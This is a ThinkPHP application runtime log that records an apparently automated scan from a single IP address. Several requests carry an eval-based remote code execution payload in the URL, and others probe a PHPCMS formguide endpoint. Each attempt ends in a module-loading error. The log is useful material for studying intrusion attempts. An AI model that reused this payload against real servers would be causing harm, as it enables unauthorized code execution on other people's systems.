[ 2017-07-20T10:49:39+08:00 ] 180.91.146.144 //index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
ERR: 无法加载模块:Module

[ 2017-07-20T10:49:39+08:00 ] 180.91.146.144 //index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Module

[ 2017-07-20T10:49:39+08:00 ] 180.91.146.144 //index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Module

[ 2017-07-20T10:49:40+08:00 ] 180.91.146.144 //index.php?m=formguide&c=index&a=show&formid=1&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: 无法加载模块:Formguide

[ 2017-07-20T10:49:40+08:00 ] 180.91.146.144 //index.php?m=formguide&c=index&a=show&formid=1&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Formguide

[ 2017-07-20T10:49:40+08:00 ] 180.91.146.144 //index.php?m=formguide&c=index&a=show&formid=1&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: 无法加载模块:Formguide

